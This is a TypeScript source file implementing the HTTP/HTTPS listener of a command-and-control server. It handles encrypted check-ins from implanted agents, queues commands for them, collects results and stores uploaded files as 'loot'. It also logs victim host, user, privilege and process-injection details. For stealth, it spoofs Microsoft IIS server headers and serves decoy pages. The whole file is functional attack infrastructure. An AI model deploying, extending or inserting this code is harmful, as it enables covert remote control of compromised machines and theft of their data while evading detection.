import { EventEmitter } from 'events';
import express, { Express, Request, Response } from 'express';
import http from 'http';
import https from 'https';
import { IListener, ListenerConfig, AgentCheckInData, TaskResultData } from './IListener.js';
import { cryptoService } from '../cryptoService.js';
import { taskQueueService } from '../taskQueueService.js';
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

/**
 * HTTP/HTTPS Listener Implementation
 * Provides beacon endpoints for agent communication:
 * - POST /beacon - Agent check-in with system info
 * - GET /tasks/:agentId - Poll for pending tasks
 * - POST /results/:taskId - Submit task results
 * - GET /stage - Download stage payload (optional)
 */

interface EncryptedPayload {
    iv: string;
    data: string;
    tag: string;
}

interface BeaconRequest {
    type: 'checkin' | 'heartbeat';
    agentId?: string;
    sessionKey?: string; // RSA-encrypted AES session key (for new agents)
    data: EncryptedPayload; // AES-encrypted agent info
}

interface BeaconResponse {
    status: 'ok' | 'registered' | 'error';
    agentId?: string;
    serverKey?: string; // Server's public key for new agents
    tasks?: any[];
    error?: string;
}

export class HttpListener extends EventEmitter implements IListener {
    readonly config: ListenerConfig;
    private app: Express;
    private server: http.Server | https.Server | null = null;
    private running: boolean = false;
    private tlsOptions?: { key: string; cert: string };

    constructor(config: ListenerConfig, tlsOptions?: { key: string; cert: string }) {
        super();
        this.config = config;
        this.tlsOptions = tlsOptions;
        this.app = express();
        this.setupMiddleware();
        this.setupRoutes();
    }

    private setupMiddleware(): void {
        // Parse JSON bodies
        this.app.use(express.json({ limit: '10mb' }));
        this.app.use(express.raw({ type: 'application/octet-stream', limit: '50mb' }));

        // Log all requests
        this.app.use((req, _res, next) => {
            console.log(`[${this.config.name}] ${req.method} ${req.path} from ${req.ip}`);
            next();
        });

        // Set innocuous server headers
        this.app.use((_req, res, next) => {
            res.removeHeader('X-Powered-By');
            res.setHeader('Server', 'Microsoft-IIS/10.0');
            res.setHeader('X-AspNet-Version', '4.0.30319');
            next();
        });
    }

    private setupRoutes(): void {
        /**
         * Agent check-in endpoint
         * New agents send RSA-encrypted session key + AES-encrypted system info
         * Returning agents send heartbeat with AES-encrypted data
         */
        this.app.post('/beacon', async (req: Request, res: Response) => {
            try {
                const beacon = req.body as BeaconRequest;

                if (beacon.type === 'checkin' && beacon.sessionKey) {
                    // New agent registration
                    await this.handleNewAgent(beacon, req, res);
                } else if (beacon.type === 'heartbeat' && beacon.agentId) {
                    // Returning agent heartbeat
                    await this.handleHeartbeat(beacon, req, res);
                } else {
                    res.status(400).json({ status: 'error', error: 'Invalid beacon format' });
                }
            } catch (error) {
                console.error(`[${this.config.name}] Beacon error:`, error);
                res.status(500).json({ status: 'error', error: 'Internal server error' });
            }
        });

        /**
         * Poll for pending tasks
         * Agent polls this endpoint to get queued commands
         */
        this.app.get('/tasks/:agentId', async (req: Request, res: Response) => {
            try {
                const { agentId } = req.params;
                const session = await prisma.agentSession.findUnique({
                    where: { agentId }
                });

                if (!session) {
                    res.status(401).json({ status: 'error', error: 'Unknown agent' });
                    return;
                }

                // Update last check-in
                await prisma.agentSession.update({
                    where: { agentId },
                    data: {
                        lastCheckIn: new Date(),
                        checkInCount: { increment: 1 }
                    }
                });

                // Update agent lastSeen
                await prisma.agent.update({
                    where: { id: agentId },
                    data: { lastSeen: new Date(), status: 'active' }
                });

                // Get pending tasks
                const tasks = await taskQueueService.getPendingTasks(agentId, 10);

                // Encrypt response with session key
                const sessionKey = Buffer.from(session.sessionKey, 'base64');
                const encrypted = cryptoService.encryptWithSessionKey(
                    tasks.map(t => ({
                        id: t.id,
                        type: t.type,
                        command: t.command,
                        arguments: t.arguments ? JSON.parse(t.arguments) : null,
                        priority: t.priority
                    })),
                    sessionKey
                );

                res.json({ status: 'ok', tasks: encrypted });
            } catch (error) {
                console.error(`[${this.config.name}] Task poll error:`, error);
                res.status(500).json({ status: 'error', error: 'Internal server error' });
            }
        });

        /**
         * Submit task results
         * Agent posts encrypted results for completed tasks
         */
        this.app.post('/results/:taskId', async (req: Request, res: Response) => {
            try {
                const { taskId } = req.params;
                const encrypted = req.body as EncryptedPayload;

                // Get task to find agent
                const task = await taskQueueService.getTask(taskId);
                if (!task) {
                    res.status(404).json({ status: 'error', error: 'Task not found' });
                    return;
                }

                // Get session for decryption
                const session = await prisma.agentSession.findUnique({
                    where: { agentId: task.agentId }
                });

                if (!session) {
                    res.status(401).json({ status: 'error', error: 'Unknown agent' });
                    return;
                }

                // Decrypt result
                const sessionKey = Buffer.from(session.sessionKey, 'base64');
                const result = cryptoService.decryptWithSessionKeyJson<TaskResultData>(encrypted, sessionKey);

                // Complete the task
                await taskQueueService.completeTask(taskId, {
                    success: result.success,
                    output: result.output,
                    error: result.error
                });

                // Emit event
                this.emit('task_result', result);

                res.json({ status: 'ok' });
            } catch (error) {
                console.error(`[${this.config.name}] Result submission error:`, error);
                res.status(500).json({ status: 'error', error: 'Internal server error' });
            }
        });

        /**
         * Get server public key (for initial key exchange)
         */
        this.app.get('/key', async (_req: Request, res: Response) => {
            try {
                const publicKey = await cryptoService.getPublicKeyBase64();
                res.json({ key: publicKey });
            } catch (error) {
                console.error(`[${this.config.name}] Key request error:`, error);
                res.status(500).json({ status: 'error', error: 'Internal server error' });
            }
        });

        /**
         * Download file from C2 (for uploads to agent)
         */
        this.app.get('/download/:fileId', async (req: Request, res: Response) => {
            try {
                // In a real implementation, this would serve files from a staging area
                // For now, return 404
                res.status(404).send('Not found');
            } catch (error) {
                res.status(500).send('Internal server error');
            }
        });

        /**
         * Upload file from agent
         */
        this.app.post('/upload/:agentId', async (req: Request, res: Response) => {
            try {
                const { agentId } = req.params;
                const session = await prisma.agentSession.findUnique({
                    where: { agentId }
                });

                if (!session) {
                    res.status(401).json({ status: 'error', error: 'Unknown agent' });
                    return;
                }

                // Store uploaded file as loot
                // In a real implementation, decrypt and store the file
                const loot = await prisma.loot.create({
                    data: {
                        id: `loot-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
                        agentId,
                        type: 'file',
                        source: 'upload',
                        content: `File upload received: ${req.body.length} bytes`,
                        timestamp: new Date()
                    }
                });

                res.json({ status: 'ok', lootId: loot.id });
            } catch (error) {
                console.error(`[${this.config.name}] Upload error:`, error);
                res.status(500).json({ status: 'error', error: 'Internal server error' });
            }
        });

        // Health check endpoint (disguised as a normal page)
        this.app.get('/', (_req: Request, res: Response) => {
            res.send('<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>It works!</h1></body></html>');
        });

        // Catch-all for unmatched routes (return benign 404)
        this.app.use((_req: Request, res: Response) => {
            res.status(404).send('<!DOCTYPE html><html><head><title>404</title></head><body><h1>Page Not Found</h1></body></html>');
        });
    }

    /**
     * Handle new agent registration
     */
    private async handleNewAgent(beacon: BeaconRequest, req: Request, res: Response): Promise<void> {
        try {
            // Decrypt session key with server's RSA private key
            const encryptedSessionKey = Buffer.from(beacon.sessionKey!, 'base64');
            const sessionKey = await cryptoService.decryptSessionKey(encryptedSessionKey);

            // Decrypt agent info with session key
            const agentInfo = cryptoService.decryptWithSessionKeyJson<AgentCheckInData>(beacon.data, sessionKey);

            // Generate agent ID if not provided
            const agentId = agentInfo.agentId || cryptoService.generateAgentId();

            // Get remote IP
            const remoteAddr = req.ip || req.socket.remoteAddress || 'unknown';
            const externalIp = req.headers['x-forwarded-for']?.toString().split(',')[0] || remoteAddr;

            // Check if agent already exists
            const existingAgent = await prisma.agent.findUnique({ where: { id: agentId } });

            if (existingAgent) {
                // Update existing agent
                await prisma.agent.update({
                    where: { id: agentId },
                    data: {
                        lastSeen: new Date(),
                        status: 'active',
                        ip: agentInfo.ip || existingAgent.ip,
                        externalIp: externalIp
                    }
                });

                // Update session
                await prisma.agentSession.upsert({
                    where: { agentId },
                    update: {
                        sessionKey: sessionKey.toString('base64'),
                        lastCheckIn: new Date(),
                        checkInCount: { increment: 1 }
                    },
                    create: {
                        agentId,
                        sessionKey: sessionKey.toString('base64'),
                        lastCheckIn: new Date(),
                        checkInCount: 1
                    }
                });
            } else {
                // Create new agent
                const newAgent = await prisma.agent.create({
                    data: {
                        id: agentId,
                        os: agentInfo.os,
                        osVersion: agentInfo.osVersion,
                        hostname: agentInfo.hostname,
                        user: agentInfo.user,
                        privileges: agentInfo.privileges,
                        ip: agentInfo.ip,
                        externalIp: externalIp,
                        lastSeen: new Date(),
                        firstSeen: new Date(),
                        status: 'active',
                        listener: this.config.name,
                        pid: agentInfo.pid,
                        processName: agentInfo.processName,
                        processInjectionTarget: agentInfo.processInjectionTarget
                    }
                });

                // Create session
                await prisma.agentSession.create({
                    data: {
                        agentId: newAgent.id,
                        sessionKey: sessionKey.toString('base64'),
                        lastCheckIn: new Date(),
                        checkInCount: 1
                    }
                });

                // Emit check-in event
                this.emit('agent_checkin', {
                    ...agentInfo,
                    agentId: newAgent.id,
                    externalIp
                }, remoteAddr);
            }

            // Send success response
            const response: BeaconResponse = {
                status: 'registered',
                agentId
            };

            // Encrypt response with session key
            const encrypted = cryptoService.encryptWithSessionKey(response, sessionKey);
            res.json(encrypted);

        } catch (error) {
            console.error(`[${this.config.name}] New agent registration error:`, error);
            res.status(400).json({ status: 'error', error: 'Registration failed' });
        }
    }

    /**
     * Handle heartbeat from existing agent
     */
    private async handleHeartbeat(beacon: BeaconRequest, req: Request, res: Response): Promise<void> {
        try {
            const session = await prisma.agentSession.findUnique({
                where: { agentId: beacon.agentId }
            });

            if (!session) {
                res.status(401).json({ status: 'error', error: 'Unknown agent - please re-register' });
                return;
            }

            const sessionKey = Buffer.from(session.sessionKey, 'base64');

            // Update session
            await prisma.agentSession.update({
                where: { agentId: beacon.agentId },
                data: {
                    lastCheckIn: new Date(),
                    checkInCount: { increment: 1 }
                }
            });

            // Update agent lastSeen and status
            const remoteAddr = req.headers['x-forwarded-for']?.toString().split(',')[0] || req.ip || 'unknown';
            await prisma.agent.update({
                where: { id: beacon.agentId },
                data: {
                    lastSeen: new Date(),
                    status: 'active',
                    externalIp: remoteAddr
                }
            });

            // Get pending tasks
            const tasks = await taskQueueService.getPendingTasks(beacon.agentId!, 10);

            // Build response
            const response: BeaconResponse = {
                status: 'ok',
                tasks: tasks.map(t => ({
                    id: t.id,
                    type: t.type,
                    command: t.command,
                    arguments: t.arguments ? JSON.parse(t.arguments) : null,
                    priority: t.priority
                }))
            };

            // Encrypt response
            const encrypted = cryptoService.encryptWithSessionKey(response, sessionKey);
            res.json(encrypted);

        } catch (error) {
            console.error(`[${this.config.name}] Heartbeat error:`, error);
            res.status(500).json({ status: 'error', error: 'Heartbeat failed' });
        }
    }

    async start(): Promise<void> {
        if (this.running) {
            console.log(`[${this.config.name}] Already running`);
            return;
        }

        // Initialize crypto service
        await cryptoService.init();

        return new Promise((resolve, reject) => {
            try {
                if (this.config.type === 'HTTPS' && this.tlsOptions) {
                    this.server = https.createServer(this.tlsOptions, this.app);
                } else {
                    this.server = http.createServer(this.app);
                }

                this.server.on('error', (err: NodeJS.ErrnoException) => {
                    console.error(`[${this.config.name}] Server error:`, err.message);
                    this.emit('error', err);
                    if (!this.running) {
                        reject(err);
                    }
                });

                this.server.listen(this.config.port, this.config.host, () => {
                    this.running = true;
                    console.log(`[${this.config.name}] HTTP Listener started on ${this.config.host}:${this.config.port}`);
                    this.emit('started');
                    resolve();
                });
            } catch (error) {
                reject(error);
            }
        });
    }

    async stop(): Promise<void> {
        if (!this.running || !this.server) {
            return;
        }

        return new Promise((resolve) => {
            this.server!.close(() => {
                this.running = false;
                this.server = null;
                console.log(`[${this.config.name}] HTTP Listener stopped`);
                this.emit('stopped');
                resolve();
            });
        });
    }

    isRunning(): boolean {
        return this.running;
    }
}
